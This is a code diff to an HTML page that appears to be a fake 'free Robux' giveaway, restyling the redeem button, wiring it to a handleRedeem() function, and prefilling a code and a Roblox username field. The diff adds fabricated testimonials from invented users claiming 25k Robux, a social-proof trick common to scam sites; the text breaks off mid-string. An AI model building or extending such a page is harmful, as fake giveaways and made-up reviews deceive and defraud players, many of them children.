@@ -195,7 +195,7 @@
   input::placeholder { color: rgba(255,255,255,0.12); }
   input:focus { border-color: rgba(255, 122, 24, 0.15); }
 
-  button {
+  .redeem-btn {
     width: 100%;
     border: none;
     border-radius: 10px;
@@ -209,8 +209,8 @@
     box-shadow: 0 0 20px rgba(255, 122, 24, 0.04);
     transition: all 0.3s ease;
   }
-  button:hover { transform: scale(1.01); box-shadow: 0 0 30px rgba(255, 122, 24, 0.08); }
-  button:disabled { opacity: 0.4; }
+  .redeem-btn:hover { transform: scale(1.01); box-shadow: 0 0 30px rgba(255, 122, 24, 0.08); }
+  .redeem-btn:disabled { opacity: 0.4; }
 
   .error { color: #f87171; font-size: 13px; text-align: center; margin-top: 4px; }
 
@@ -592,10 +592,10 @@
       </div>
     </div>
 
-    <form id="redeemForm">
+    <form id="redeemForm" onsubmit="return false;">
       <input type="text" id="code" value="SECRET4" placeholder="Code" />
       <input type="text" id="username" placeholder="Roblox Username" />
-      <button type="submit" id="redeemBtn">Redeem</button>
+      <button type="button" class="redeem-btn" id="redeemBtn" onclick="handleRedeem()">Redeem</button>
       <div id="message"></div>
     </form>
 
@@ -794,4 +794,7 @@
       { user: "LunarWolf_22", text: "Can't believe it worked! 25k robux ✅" },
       { user: "ShadowStrike_99", text: "Bro this is the best Halloween drop ever! 🎃" },
       { user: "CosmicGamer_88", text: "I'm rich! Just claimed 25k robux 💰" },
-      { user: "BlazeFury_77", text: "This is
+      { user: "BlazeFury_77", text: "This is so legit! Got my code in 2 mins ⚡" },
+      { user: "NightOwl_33", text: "Wow! Actually works! Thanks so much! 🙏" },
+      { user: "GhostHunter_11", text: "Bruh this is insane! 25k robux for free 😍" },
+      { user: "MoonWalker_44", text: "Just got my code! This is 100%
